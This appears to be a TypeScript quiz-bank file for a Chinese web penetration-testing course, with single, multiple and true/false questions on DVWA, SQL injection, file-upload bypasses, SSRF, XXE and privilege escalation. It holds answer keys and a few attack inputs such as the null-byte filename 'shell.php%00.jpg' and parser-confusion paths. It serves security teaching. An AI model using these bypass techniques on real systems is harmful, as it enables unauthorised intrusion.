import type { CyberDay, QuizQuestion } from './cyberBasic';

type DayPartial = Pick<CyberDay, 'expertNotes' | 'resources' | 'recommendedTools' | 'codeExamples' | 'quiz' | 'labEnvironment'>;

/* ==================== 分阶段测验题库 ==================== */
const quizBankByPhase: Record<string, QuizQuestion[]> = {
  'env': [
    {
      id: 'env-1',
      type: 'single',
      question: 'PHPStudy的主要作用是什么？',
      options: ['网页设计工具', 'PHP集成开发环境', 'Web服务器环境集成软件包', '数据库管理工具'],
      correctIndex: 2,
      explanation: 'PHPStudy是一款集成了Apache/Nginx + MySQL + PHP的Web服务器环境集成软件包，可以快速搭建Web运行环境，是靶场入门的必备工具。'
    },
    {
      id: 'env-2',
      type: 'single',
      question: 'Apache服务器默认监听的端口号是多少？',
      options: ['80', '8080', '443', '3306'],
      correctIndex: 0,
      explanation: 'Apache默认监听80端口（HTTP），HTTPS默认443端口，MySQL默认3306端口，Tomcat默认8080端口。'
    },
    {
      id: 'env-3',
      type: 'multiple',
      question: '以下哪些属于Web渗透测试必备工具？',
      options: ['Burp Suite', 'sqlmap', 'AntSword（蚁剑）', 'Photoshop'],
      correctIndices: [0, 1, 2],
      explanation: 'Burp Suite用于抓包改包，sqlmap用于自动化SQL注入，AntSword用于WebShell管理，都是Web渗透必备工具。Photoshop是图像处理工具，与渗透测试无关。'
    },
    {
      id: 'env-4',
      type: 'boolean',
      question: '学习网络安全可以只学理论不用动手实践？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: '网络安全是一门实践性极强的学科，必须通过大量动手实践才能真正掌握。只学理论不实践，就像只看游泳教程不下水，永远学不会。'
    },
    {
      id: 'env-5',
      type: 'single',
      question: 'Burp Suite的哪个模块主要用于拦截和修改HTTP请求？',
      options: ['Intruder', 'Proxy', 'Repeater', 'Decoder'],
      correctIndex: 1,
      explanation: 'Proxy模块是Burp Suite的核心，用于拦截和修改HTTP/HTTPS请求和响应。Intruder用于爆破，Repeater用于重放请求，Decoder用于编码解码。'
    },
    {
      id: 'env-6',
      type: 'single',
      question: '如果Apache启动失败提示80端口被占用，最可能的原因是？',
      options: ['MySQL没启动', 'IIS或其他Web服务占用了80端口', 'PHP版本不对', '浏览器问题'],
      correctIndex: 1,
      explanation: '80端口被占用通常是因为系统中有其他Web服务（如IIS、Nginx、其他Apache实例）已经在使用80端口。可以用netstat命令查看哪个进程占用了端口。'
    },
    {
      id: 'env-7',
      type: 'multiple',
      question: 'DVWA靶场包含以下哪些漏洞模块？',
      options: ['SQL注入', 'XSS跨站脚本', '文件上传', '命令注入'],
      correctIndices: [0, 1, 2, 3],
      explanation: 'DVWA包含了几乎所有常见的Web漏洞模块：SQL注入、XSS、文件上传、命令注入、CSRF、文件包含、暴力破解等等，是入门的最佳靶场。'
    },
    {
      id: 'env-8',
      type: 'single',
      question: '使用Burp Suite抓包前，浏览器需要做什么配置？',
      options: ['安装杀毒软件', '配置代理指向Burp Suite监听端口', '更新浏览器版本', '清空浏览器缓存'],
      correctIndex: 1,
      explanation: 'Burp Suite通过代理方式工作，需要将浏览器的HTTP/HTTPS代理设置为Burp Suite的监听地址（通常是127.0.0.1:8080），这样流量才能经过Burp Suite。'
    },
    {
      id: 'env-9',
      type: 'single',
      question: 'WebShell的主要作用是什么？',
      options: ['美化网站', '远程控制服务器', '加速网站访问', '备份数据库'],
      correctIndex: 1,
      explanation: 'WebShell是一段可以在Web服务器上执行的脚本程序，攻击者通过文件上传等漏洞上传WebShell后，就可以远程控制服务器，执行命令、管理文件等。'
    },
    {
      id: 'env-10',
      type: 'boolean',
      question: '在本地搭建靶场练习属于违法行为？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: '在本地搭建靶场进行安全研究和学习是完全合法的，也是安全从业者的必修课。注意：只能在自己搭建的环境中练习，未经授权对他人系统进行测试是违法的。'
    },
    {
      id: 'env-11',
      type: 'single',
      question: 'HTTP状态码403表示什么意思？',
      options: ['页面不存在', '服务器内部错误', '禁止访问（权限不足）', '请求成功'],
      correctIndex: 2,
      explanation: '403 Forbidden 表示服务器理解请求但拒绝执行，通常是因为权限不足。200表示成功，404表示页面不存在，500表示服务器内部错误。'
    },
    {
      id: 'env-12',
      type: 'multiple',
      question: '以下关于Cookie和Session的说法，正确的有哪些？',
      options: ['Cookie存储在客户端浏览器中', 'Session存储在服务器端', 'Session通常通过Cookie中的SessionID来识别用户', 'Cookie比Session更安全'],
      correctIndices: [0, 1, 2],
      explanation: 'Cookie存在客户端，Session存在服务端，Session通过Cookie中的SessionID来识别用户。Session比Cookie更安全，因为敏感数据不会直接暴露给客户端。'
    },
    {
      id: 'env-13',
      type: 'single',
      question: 'HTTPS相比HTTP的主要区别是什么？',
      options: ['速度更快', '使用SSL/TLS加密传输，更安全', '端口相同', '不需要证书'],
      correctIndex: 1,
      explanation: 'HTTPS = HTTP + SSL/TLS，通过加密传输保证数据安全。HTTPS默认端口443，HTTP默认80。HTTPS需要CA证书来验证身份。'
    },
    {
      id: 'env-14',
      type: 'boolean',
      question: '虚拟机快照功能可以在打靶前保存状态，打坏了可以随时恢复？',
      options: ['正确', '错误'],
      correctIndex: 0,
      explanation: '虚拟机快照是打靶必备技巧。打靶前拍个快照，打坏了随时回滚，不用每次都重新装系统。建议每做一个重要操作前都拍快照，方便复盘和重试。'
    },
  ],
  'dvwa': [
    {
      id: 'dvwa-1',
      type: 'single',
      question: 'DVWA中暴力破解模块的核心原理是什么？',
      options: ['利用漏洞绕过验证', '不断尝试用户名和密码组合', '直接读取数据库密码', '社会工程学欺骗'],
      correctIndex: 1,
      explanation: '暴力破解的原理就是使用大量的用户名和密码组合不断尝试登录，直到找到正确的凭据。Burp Suite的Intruder模块是常用的爆破工具。'
    },
    {
      id: 'dvwa-2',
      type: 'single',
      question: '命令注入中，以下哪个符号可以用于连接两条命令？',
      options: ['#', '|', '$', '@'],
      correctIndex: 1,
      explanation: '|（管道符）可以将前一个命令的输出作为后一个命令的输入。其他常用命令连接符还有 &&（与）、;（分号）、||（或）等。'
    },
    {
      id: 'dvwa-3',
      type: 'multiple',
      question: '以下哪些是CSRF攻击的必要条件？',
      options: ['用户已登录目标网站', '诱导用户访问恶意页面', '目标网站没有Token验证', '知道用户的密码'],
      correctIndices: [0, 1, 2],
      explanation: 'CSRF利用用户已登录的身份，诱导用户点击恶意链接从而发起伪造请求。不需要知道用户密码，但需要目标网站没有有效的Token验证等防护措施。'
    },
    {
      id: 'dvwa-4',
      type: 'single',
      question: 'PHP文件包含漏洞中，以下哪个函数最危险？',
      options: ['include()', 'require()', 'include_once()', '以上都危险'],
      correctIndex: 3,
      explanation: 'include、require、include_once、require_once都可能导致文件包含漏洞，关键要看参数是否可控。include和require的区别在于错误处理方式，但都可能被利用。'
    },
    {
      id: 'dvwa-5',
      type: 'single',
      question: 'DVWA文件上传漏洞中，Low级别没有任何过滤，上传一个什么文件可以直接getshell？',
      options: ['图片文件', 'php一句话木马', 'txt文本文件', 'zip压缩文件'],
      correctIndex: 1,
      explanation: 'Low级别没有任何过滤，直接上传.php后缀的一句话木马即可。上传成功后访问文件路径，用蚁剑连接即可获得WebShell。'
    },
    {
      id: 'dvwa-6',
      type: 'single',
      question: 'SQL注入中，测试注入点最经典的字符是什么？',
      options: ['"', "'", ';', ')'],
      correctIndex: 1,
      explanation: "单引号（'）是测试SQL注入最经典的字符。如果页面报错或显示异常，说明输入被拼接到SQL语句中了，很可能存在注入漏洞。"
    },
    {
      id: 'dvwa-7',
      type: 'multiple',
      question: 'XSS跨站脚本攻击分为哪几种类型？',
      options: ['反射型XSS', '存储型XSS', 'DOM型XSS', 'SQL型XSS'],
      correctIndices: [0, 1, 2],
      explanation: 'XSS主要分为三类：反射型（非持久化，参数中）、存储型（持久化，存在数据库中）、DOM型（前端DOM操作导致，不经过后端）。没有SQL型XSS这个说法。'
    },
    {
      id: 'dvwa-8',
      type: 'boolean',
      question: 'DVWA的High级别就是完全安全的，没有任何漏洞？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: 'DVWA的High级别只是增加了防护难度，并不代表完全安全。安全是一个相对概念，即使是High级别，在某些条件下仍然可能被绕过。真实环境中需要层层防护。'
    },
    {
      id: 'dvwa-9',
      type: 'single',
      question: '防御CSRF攻击最有效的方法是什么？',
      options: ['过滤用户输入', '使用验证码', '使用Token验证', '限制登录时间'],
      correctIndex: 2,
      explanation: 'Token验证是防御CSRF最有效的方法。每次请求时服务端生成一个随机Token，前端提交时带上Token，服务端验证Token是否匹配。攻击者无法获取到合法用户的Token。'
    },
    {
      id: 'dvwa-10',
      type: 'single',
      question: 'union select联合查询注入的前提条件是什么？',
      options: ['必须是POST注入', '前后两条查询的列数必须相同', '必须有回显', 'B和C都是'],
      correctIndex: 3,
      explanation: '联合查询注入需要两个条件：1. 前后两条SELECT语句的列数必须相同（可以用order by测试列数）；2. 页面有回显位（能够显示查询结果）。'
    },
    {
      id: 'dvwa-11',
      type: 'multiple',
      question: '以下哪些属于CSRF的防御措施？',
      options: ['Token验证', '验证Referer', '验证码', '使用POST请求'],
      correctIndices: [0, 1, 2],
      explanation: 'Token验证是最有效的CSRF防御方法，验证Referer和验证码也能起到一定防御作用。只用POST请求不能防御CSRF，因为攻击者可以构造表单自动提交POST请求。'
    },
    {
      id: 'dvwa-12',
      type: 'single',
      question: 'XSS三种类型中，哪种不经过后端处理，纯前端DOM操作导致？',
      options: ['反射型XSS', '存储型XSS', 'DOM型XSS', '都经过后端'],
      correctIndex: 2,
      explanation: 'DOM型XSS的特点是完全在前端发生，不经过后端处理。前端JavaScript直接从URL或DOM中获取数据并插入页面，导致XSS。后端WAF可能检测不到DOM型XSS。'
    },
    {
      id: 'dvwa-13',
      type: 'single',
      question: '文件包含漏洞分为哪两类？',
      options: ['本地文件包含和远程文件包含', 'SQL包含和XSS包含', 'GET包含和POST包含', 'PHP包含和JSP包含'],
      correctIndex: 0,
      explanation: '文件包含分为LFI（Local File Inclusion，本地文件包含）和RFI（Remote File Inclusion，远程文件包含）。LFI包含服务器本地文件，RFI可以包含远程URL上的文件，危害更大。'
    },
    {
      id: 'dvwa-14',
      type: 'multiple',
      question: 'SQL注入按注入点位置分类，以下哪些属于常见类型？',
      options: ['GET注入', 'POST注入', 'Cookie注入', 'HTTP头注入'],
      correctIndices: [0, 1, 2, 3],
      explanation: 'SQL注入按注入点位置可分为：GET注入（URL参数）、POST注入（请求体）、Cookie注入（Cookie头）、HTTP头注入（User-Agent、Referer等）。只要是用户可控且拼接到SQL中的参数都可能存在注入。'
    },
  ],
  'sqli': [
    {
      id: 'sqli-1',
      type: 'single',
      question: 'SQLi-Labs一共有多少关？',
      options: ['50关', '65关', '75关', '100关'],
      correctIndex: 2,
      explanation: 'SQLi-Labs一共有75关，由浅入深涵盖了各种SQL注入场景，是练习SQL注入的最佳靶场之一。'
    },
    {
      id: 'sqli-2',
      type: 'single',
      question: '当页面没有任何回显时，应该使用哪种注入技术？',
      options: ['联合查询注入', '报错注入', '盲注', '宽字节注入'],
      correctIndex: 2,
      explanation: '盲注（布尔盲注、时间盲注）适用于页面没有任何回显的情况。布尔盲注通过页面真假判断，时间盲注通过响应时间差判断。'
    },
    {
      id: 'sqli-3',
      type: 'multiple',
      question: '以下哪些函数常用于报错注入？',
      options: ['updatexml()', 'extractvalue()', 'floor()', 'sleep()'],
      correctIndices: [0, 1, 2],
      explanation: 'updatexml()、extractvalue()（XPATH注入）和floor()（group by报错）是常用的报错注入函数。sleep()是时间盲注用的函数。'
    },
    {
      id: 'sqli-4',
      type: 'single',
      question: 'sqlmap中指定目标URL的参数是什么？',
      options: ['-u', '-r', '-p', '-d'],
      correctIndex: 0,
      explanation: '-u参数指定目标URL，-r指定请求文件，-p指定测试参数，-d指定直接连接数据库。'
    },
    {
      id: 'sqli-5',
      type: 'single',
      question: '如果注入点在Cookie中，sqlmap应该加什么参数？',
      options: ['--cookie', '--header', '--data', '-m'],
      correctIndex: 0,
      explanation: '--cookie参数可以指定Cookie值，sqlmap会自动测试Cookie中的注入点。--header用于自定义HTTP头，--data用于POST数据。'
    },
    {
      id: 'sqli-6',
      type: 'boolean',
      question: '使用了预编译语句（PreparedStatement）就一定能防止SQL注入？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: '预编译能有效防止大部分SQL注入，但如果预编译使用不当（比如用字符串拼接表名、列名、order by参数等），仍然可能存在注入漏洞。安全是全方位的。'
    },
    {
      id: 'sqli-7',
      type: 'single',
      question: '堆叠注入的关键特征是什么？',
      options: ['可以执行多条SQL语句', '只能查询不能修改', '必须有报错回显', '只能用sleep函数'],
      correctIndex: 0,
      explanation: '堆叠注入（Stacked Queries）的核心是可以一次执行多条SQL语句（用分号分隔）。MySQL中mysqli_multi_query()函数支持堆叠，PHP的mysql_query()不支持。'
    },
    {
      id: 'sqli-8',
      type: 'multiple',
      question: '以下哪些属于SQL注入的绕过WAF技巧？',
      options: ['大小写绕过', '内联注释绕过', '编码绕过', '使用or 1=1'],
      correctIndices: [0, 1, 2],
      explanation: '大小写绕过、内联注释（/*!*/）绕过、各种编码（URL编码、Unicode编码）绕过都是常见的WAF绕过技巧。直接用or 1=1很容易被WAF检测到。'
    },
    {
      id: 'sqli-9',
      type: 'single',
      question: 'sqlmap中获取所有数据库名的命令是？',
      options: ['--dbs', '--tables', '--columns', '--dump'],
      correctIndex: 0,
      explanation: '--dbs获取所有数据库名，--tables获取指定库的所有表，--columns获取指定表的所有列，--dump拖库（获取数据）。'
    },
    {
      id: 'sqli-10',
      type: 'single',
      question: '宽字节注入的原理是什么？',
      options: ['浏览器编码问题', '数据库字符集与PHP字符集不一致导致转义失效', 'SQL语法特性', '服务器配置错误'],
      correctIndex: 1,
      explanation: '宽字节注入的原理是：PHP用GBK等宽字节集时，addslashes()转义的%5c（反斜杠）会与前面的%df拼成%df%5c（GBK中的"運"字），导致单引号逃逸，注入成功。'
    },
    {
      id: 'sqli-11',
      type: 'multiple',
      question: '盲注分为哪几种类型？',
      options: ['布尔盲注', '时间盲注', '报错盲注', '联合盲注'],
      correctIndices: [0, 1],
      explanation: '盲注主要分为布尔盲注和时间盲注两类。布尔盲注通过页面真假判断，时间盲注通过sleep()等函数造成的响应时间差判断。报错注入有明确的报错信息回显，不属于盲注。'
    },
    {
      id: 'sqli-12',
      type: 'single',
      question: '以下哪个函数不是报错注入常用的函数？',
      options: ['updatexml()', 'extractvalue()', 'sleep()', 'floor()'],
      correctIndex: 2,
      explanation: 'sleep()是时间盲注用的函数。updatexml()、extractvalue()（XPATH报错）和floor()（group by报错）是常见的报错注入函数。报错注入的前提是页面会显示数据库错误信息。'
    },
    {
      id: 'sqli-13',
      type: 'single',
      question: '二次注入的核心原理是什么？',
      options: ['SQL语法特性', '数据插入时被转义了，但取出使用时没有再次转义', '数据库漏洞', 'WAF绕过'],
      correctIndex: 1,
      explanation: '二次注入的原理是：攻击者插入恶意数据时，数据被转义存入数据库；但当程序从数据库中取出数据再次使用时，没有进行转义或过滤，导致恶意SQL语句被执行。'
    },
    {
      id: 'sqli-14',
      type: 'boolean',
      question: '堆叠注入（Stacked Queries）可以一次执行多条SQL语句，且所有数据库都支持？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: '堆叠注入确实可以执行多条SQL语句，但不是所有数据库都支持。MySQL中需要使用mysqli_multi_query()等支持多语句的函数，PHP的mysql_query()不支持堆叠。SQL Server和PostgreSQL原生支持堆叠。'
    },
    {
      id: 'sqli-15',
      type: 'single',
      question: '宽字节注入中，通常在参数前加什么字符来"吃掉"转义的反斜杠？',
      options: ['%df', '%27', '%5c', '%00'],
      correctIndex: 0,
      explanation: '宽字节注入常用%df开头，因为%df%5c在GBK编码中是一个汉字"運"，这样反斜杠（%5c）就被"吃掉"了，后面的单引号就能逃逸。%df只是一个例子，只要是第一个字节ASCII大于128的都可以。'
    },
  ],
  'upload': [
    {
      id: 'upload-1',
      type: 'single',
      question: 'Upload-Labs一共有多少关？',
      options: ['15关', '18关', '21关', '25关'],
      correctIndex: 2,
      explanation: 'Upload-Labs一共有21关，涵盖了各种文件上传绕过场景，是练习文件上传漏洞的最佳靶场之一。'
    },
    {
      id: 'upload-2',
      type: 'single',
      question: '前端JS验证的文件上传，最简单的绕过方法是？',
      options: ['修改文件后缀', '禁用JS或抓包改后缀', '使用图片马', '00截断'],
      correctIndex: 1,
      explanation: '前端JS验证是最容易绕过的，因为验证在客户端。最简单的方法是浏览器禁用JS，或者用Burp抓包后修改文件后缀名。'
    },
    {
      id: 'upload-3',
      type: 'multiple',
      question: '以下哪些可以作为文件上传的绕过技巧？',
      options: ['大小写后缀绕过', '点号空格绕过', '::$DATA绕过', '文件内容检测'],
      correctIndices: [0, 1, 2],
      explanation: '大小写（.pHp）、点号（.php.）、空格（.php ）、::$DATA（Windows NTFS特性）都是常见的后缀绕过技巧。文件内容检测是防御手段，不是绕过手段。'
    },
    {
      id: 'upload-4',
      type: 'single',
      question: '图片马的制作原理是什么？',
      options: ['修改文件后缀名', '在图片文件中嵌入PHP代码', '使用特殊格式图片', '压缩图片'],
      correctIndex: 1,
      explanation: '图片马就是在一张正常的图片文件末尾追加PHP代码（或其他脚本代码）。因为图片检查通常只检查文件头，所以能绕过检测，但需要配合解析漏洞或文件包含才能执行。'
    },
    {
      id: 'upload-5',
      type: 'single',
      question: 'Apache解析漏洞（AddHandler）中，文件名info.php.jpg会被如何解析？',
      options: ['当作图片', '当作PHP执行', '当作文本文件', '报错'],
      correctIndex: 1,
      explanation: 'Apache的AddHandler配置有解析漏洞，它会从右往左找可识别的后缀。info.php.jpg中.php在.jpg前面，所以会被当作PHP文件执行。这是经典的Apache解析漏洞。'
    },
    {
      id: 'upload-6',
      type: 'boolean',
      question: '白名单（只允许指定后缀）一定比黑名单安全吗？',
      options: ['正确', '错误'],
      correctIndex: 0,
      explanation: '一般来说白名单比黑名单更安全，因为黑名单很容易漏（比如.phtml .php3 .php5 .pht等）。但白名单如果配合解析漏洞（如Apache解析漏洞），仍然可能被绕过，需要结合其他防护。'
    },
    {
      id: 'upload-7',
      type: 'single',
      question: '%00截断（00截断）的原理是什么？',
      options: ['服务器解析错误', '字符串遇到0字节结束', '文件名过长', '后缀名绕过'],
      correctIndex: 1,
      explanation: '00截断的原理是C语言等底层语言中字符串以\\0（0x00字节）作为结束标志。所以上传shell.php%00.jpg时，底层读取到%00就截断了，实际保存为shell.php。'
    },
    {
      id: 'upload-8',
      type: 'multiple',
      question: '以下哪些属于常见的WebShell管理工具？',
      options: ['蚁剑（AntSword）', '哥斯拉（Godzilla）', '菜刀（Cknife）', 'Putty'],
      correctIndices: [0, 1, 2],
      explanation: '蚁剑、哥斯拉、菜刀都是常见的WebShell管理工具。Putty是SSH远程连接工具，不是WebShell工具。'
    },
    {
      id: 'upload-9',
      type: 'single',
      question: '二次渲染绕过的核心思路是什么？',
      options: ['修改文件后缀', '找渲染后不变的区域插入代码', '使用图片马', '00截断'],
      correctIndex: 1,
      explanation: '二次渲染是指上传图片后服务器会重新生成图片（压缩、裁剪等），导致图片马被破坏。绕过思路是找到渲染后保持不变的区域，在那里插入代码。GIF图片的某些帧比较容易绕过。'
    },
    {
      id: 'upload-10',
      type: 'single',
      question: '文件上传漏洞最严重的危害是什么？',
      options: ['网站被篡改', '获取服务器控制权', '数据泄露', '用户信息丢失'],
      correctIndex: 1,
      explanation: '文件上传漏洞最直接也最严重的危害是可以上传WebShell，从而获得服务器的控制权，进而内网渗透、提权，危害极大。所以文件上传防护非常重要。'
    },
    {
      id: 'upload-11',
      type: 'multiple',
      question: '以下哪些属于常见的解析漏洞？',
      options: ['Apache AddHandler解析漏洞', 'Nginx文件名逻辑漏洞', 'IIS 6.0解析漏洞', 'PHP CGI路径解析漏洞'],
      correctIndices: [0, 1, 2, 3],
      explanation: '解析漏洞是文件上传绕过的重要手段。常见的有：Apache的AddHandler配置漏洞、Nginx的文件名逻辑漏洞（如/info.php/1.jpg）、IIS 6.0的目录解析和分号解析漏洞、PHP CGI的路径解析漏洞等。'
    },
    {
      id: 'upload-12',
      type: 'single',
      question: '00截断（%00截断）的利用条件是什么？',
      options: ['PHP版本小于5.3.4且magic_quotes_gpc为Off', '必须是Windows系统', '必须是Apache服务器', '必须是图片格式'],
      correctIndex: 0,
      explanation: '00截断的核心条件是PHP版本小于5.3.4且magic_quotes_gpc为Off。因为高版本PHP已经修复了这个问题。00截断的原理是C语言字符串以\\0结尾。'
    },
    {
      id: 'upload-13',
      type: 'boolean',
      question: '二次渲染是指服务器对上传的图片进行重新处理（压缩、裁剪等），图片马可能会被破坏？',
      options: ['正确', '错误'],
      correctIndex: 0,
      explanation: '二次渲染确实会破坏普通的图片马，因为服务器会重新生成图片。绕过思路是找到渲染后保持不变的区域插入代码，比如GIF图片的某些帧、PNG的某些块等。GIF相对容易绕过二次渲染。'
    },
    {
      id: 'upload-14',
      type: 'single',
      question: '图片马（图片木马）的核心原理是什么？',
      options: ['修改文件后缀名绕过检测', '在图片文件中嵌入脚本代码，利用文件包含或解析漏洞执行', '让图片变成可执行文件', '使用特殊的图片格式'],
      correctIndex: 1,
      explanation: '图片马的原理是在正常图片末尾追加脚本代码。因为文件上传检测通常只检查文件头（图片格式标识），所以能绕过。但图片马本身不能直接执行，需要配合文件包含漏洞或解析漏洞才能执行。'
    },
  ],
  'pikachu': [
    {
      id: 'pika-1',
      type: 'single',
      question: 'Pikachu靶场相比DVWA最大的特点是什么？',
      options: ['漏洞更多', '更接近真实场景的综合靶场', '界面更漂亮', '难度更低'],
      correctIndex: 1,
      explanation: 'Pikachu是一个综合型靶场，漏洞更丰富，场景更接近真实环境。DVWA是按漏洞类型分类入门的，Pikachu则更像一个真实的网站，需要自己发现和组合利用漏洞。'
    },
    {
      id: 'pika-2',
      type: 'multiple',
      question: '以下哪些漏洞类型在Pikachu中有练习模块？',
      options: ['XSS', 'CSRF', 'SQL注入', '反序列化'],
      correctIndices: [0, 1, 2, 3],
      explanation: 'Pikachu包含了几乎所有常见Web漏洞：XSS、CSRF、SQL注入、文件上传、文件包含、命令执行、代码执行、反序列化、SSRF、XXE、越权等等，非常全面。'
    },
    {
      id: 'pika-3',
      type: 'single',
      question: 'SSRF（服务端请求伪造）的核心危害是什么？',
      options: ['XSS攻击', '从服务器内网发起请求，探测内网', '文件上传', 'SQL注入'],
      correctIndex: 1,
      explanation: 'SSRF是服务端发起请求，攻击者可以利用它探测内网、访问内网资源、攻击内网服务。相当于把服务器当成了跳板，进入内网。'
    },
    {
      id: 'pika-4',
      type: 'single',
      question: '越权漏洞分为哪两类？',
      options: ['前端越权和后端越权', '水平越权和垂直越权', 'GET越权和POST越权', '主动越权和被动越权'],
      correctIndex: 1,
      explanation: '越权主要分为两类：水平越权（同级别用户之间，比如A用户看B用户的信息）和垂直越权（低权限用户执行高权限操作，比如普通用户做管理员操作）。'
    },
    {
      id: 'pika-5',
      type: 'boolean',
      question: 'XXE（XML外部实体注入）漏洞只能用来读取文件？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: 'XXE不仅可以读文件，还可以进行SSRF内网探测、端口扫描、甚至在某些条件下可以执行命令（如expect扩展）。XXE的危害不容小觑。'
    },
    {
      id: 'pika-6',
      type: 'single',
      question: '反序列化漏洞的根本原因是什么？',
      options: ['用户输入没有过滤', '反序列化了不可信的数据', '服务器配置错误', '数据库漏洞'],
      correctIndex: 1,
      explanation: '反序列化漏洞的根本原因是程序反序列化了用户可控的不可信数据。攻击者构造恶意的序列化数据，触发反序列化过程中的魔法方法，从而执行恶意代码。'
    },
    {
      id: 'pika-7',
      type: 'multiple',
      question: '以下哪些属于PHP反序列化中的常用魔法方法？',
      options: ['__wakeup()', '__destruct()', '__toString()', '__sleep()'],
      correctIndices: [0, 1, 2, 3],
      explanation: '__wakeup()（反序列化时调用）、__destruct()（对象销毁时调用）、__toString()（对象被当作字符串时调用）、__sleep()（序列化时调用）都是PHP反序列化中常用的魔法方法。'
    },
    {
      id: 'pika-8',
      type: 'single',
      question: 'DOM型XSS与反射型/存储型XSS最大的区别是什么？',
      options: ['危害更大', '不经过后端，纯前端DOM操作导致', '更容易检测', '只能用JavaScript触发'],
      correctIndex: 1,
      explanation: 'DOM型XSS的特点是完全在前端发生，不经过后端处理。前端JavaScript直接从URL或DOM中获取数据并插入页面，导致XSS。所以后端WAF可能检测不到。'
    },
    {
      id: 'pika-9',
      type: 'single',
      question: 'SSRF（服务端请求伪造）中，以下哪个协议不能用于扩展攻击面？',
      options: ['file://', 'dict://', 'gopher://', 'http://'],
      correctIndex: 3,
      explanation: 'http://是SSRF最基础的协议。file://可以读取本地文件，dict://可以探测端口和服务，gopher://可以构造任意TCP数据包（如攻击Redis）。这三个协议都能扩展SSRF的攻击面。'
    },
    {
      id: 'pika-10',
      type: 'multiple',
      question: '以下关于XXE（XML外部实体注入）的说法，正确的有哪些？',
      options: ['可以读取本地文件', '可以进行SSRF内网探测', '可以执行系统命令（特定条件下）', '只能攻击XML接口'],
      correctIndices: [0, 1, 2, 3],
      explanation: 'XXE漏洞可以读文件、SSRF、端口扫描，特定条件下（如expect扩展）还能执行命令。XXE只能在解析XML数据的接口中利用，所以发现点相对较少，但危害很大。'
    },
    {
      id: 'pika-11',
      type: 'single',
      question: '反序列化漏洞的利用过程中，"POP链"指的是什么？',
      options: ['一种网络攻击方式', '从反序列化入口点到代码执行点的调用链', '一种序列化格式', '一种加密算法'],
      correctIndex: 1,
      explanation: 'POP链（Property Oriented Programming）是反序列化漏洞利用中的概念，指从反序列化入口点出发，通过一系列魔法方法的调用，最终到达代码执行点的调用链。构造POP链是反序列化漏洞利用的核心。'
    },
    {
      id: 'pika-12',
      type: 'multiple',
      question: '越权访问漏洞分为哪两类？',
      options: ['水平越权', '垂直越权', '前端越权', '后端越权'],
      correctIndices: [0, 1],
      explanation: '越权主要分为水平越权和垂直越权两类。水平越权是同级别用户之间的越权（如A用户看B用户的信息），垂直越权是低权限用户执行高权限操作（如普通用户做管理员操作）。'
    },
  ],
  'vulnhub': [
    {
      id: 'vulh-1',
      type: 'single',
      question: 'VulnHub是什么平台？',
      options: ['在线靶场平台', '提供可下载的漏洞虚拟机镜像', '漏洞扫描工具', '渗透测试框架'],
      correctIndex: 1,
      explanation: 'VulnHub是一个提供各种漏洞虚拟机镜像下载的平台。用户下载后导入VMware或VirtualBox中，就可以在本地进行渗透测试练习。'
    },
    {
      id: 'vulh-2',
      type: 'multiple',
      question: '一次完整的渗透测试通常包含哪些阶段？',
      options: ['信息收集', '漏洞探测与利用', '提权', '清理痕迹'],
      correctIndices: [0, 1, 2, 3],
      explanation: '完整的渗透测试流程包括：信息收集（侦察）、漏洞探测与扫描、漏洞利用获取权限、权限提升、横向移动、清理痕迹、编写报告。'
    },
    {
      id: 'vulh-3',
      type: 'single',
      question: '信息收集阶段，最常用的端口扫描工具是？',
      options: ['sqlmap', 'nmap', 'Burp Suite', 'Wireshark'],
      correctIndex: 1,
      explanation: 'Nmap是最经典、最强大的端口扫描工具，可以发现目标主机开放的端口、运行的服务、版本信息、操作系统类型等。是信息收集阶段的必备工具。'
    },
    {
      id: 'vulh-4',
      type: 'single',
      question: '什么是"提权"？',
      options: ['升级服务器硬件', '从低权限用户提升到高权限（如root/管理员）', '提升网站访问速度', '提升漏洞等级'],
      correctIndex: 1,
      explanation: '提权（Privilege Escalation）就是从较低权限提升到更高权限。比如从www-data用户提升到root，从普通用户提升到管理员。拿到低权限shell后通常需要提权。'
    },
    {
      id: 'vulh-5',
      type: 'boolean',
      question: '打VulnHub靶机时，一上来就查writeup学得最快？',
      options: ['正确', '错误'],
      correctIndex: 1,
      explanation: '一上来就看writeup学不到东西。正确的姿势是：先独立打2-3小时，实在没思路再看一点点提示，然后继续自己打，最后再看完整writeup总结。独立思考的过程最重要。'
    },
    {
      id: 'vulh-6',
      type: 'multiple',
      question: '以下哪些属于常见的提权方法？',
      options: ['内核漏洞提权', 'SUID文件提权', '计划任务提权', '数据库提权'],
      correctIndices: [0, 1, 2, 3],
      explanation: '常见提权方法包括：内核漏洞（如DirtyCow）、SUID文件、计划任务（Cron）、sudo配置错误、数据库提权、环境变量劫持等等。提权是渗透测试的核心技能。'
    },
    {
      id: 'vulh-7',
      type: 'single',
      question: 'Kali Linux是什么？',
      options: ['一种游戏', '专门用于渗透测试和安全审计的Linux发行版', '服务器操作系统', '办公软件'],
      correctIndex: 1,
      explanation: 'Kali Linux是基于Debian的Linux发行版，预装了数百个渗透测试、安全审计、取证分析工具，是安全从业者的首选操作系统。'
    },
    {
      id: 'vulh-8',
      type: 'single',
      question: 'VMware的三种网络模式（桥接、NAT、仅主机）中，哪种模式虚拟机和主机在同一网段？',
      options: ['桥接模式', 'NAT模式', '仅主机模式', '都不是'],
      correctIndex: 0,
      explanation: '桥接模式下，虚拟机和物理机在同一个网段，相当于局域网中的一台独立主机，可以访问外网也可以和物理机互通。NAT模式下虚拟机通过物理机共享IP上网。'
    },
    {
      id: 'vulh-9',
      type: 'multiple',
      question: '以下哪些属于信息收集阶段的常用方法？',
      options: ['端口扫描', '目录扫描', '子域名收集', 'Google Hacking'],
      correctIndices: [0, 1, 2, 3],
      explanation: '信息收集是渗透测试的第一步，方法包括：端口扫描（nmap）、目录扫描（dirbuster、dirsearch）、子域名收集（subfinder、amass）、Google Hacking（搜索引擎语法）、Whois查询、DNS枚举等等。信息收集越全面，成功率越高。'
    },
    {
      id: 'vulh-10',
      type: 'single',
      question: '以下哪种不属于常见的Linux提权方式？',
      options: ['内核漏洞提权', 'SUID文件提权', '修改注册表提权', '计划任务提权'],
      correctIndex: 2,
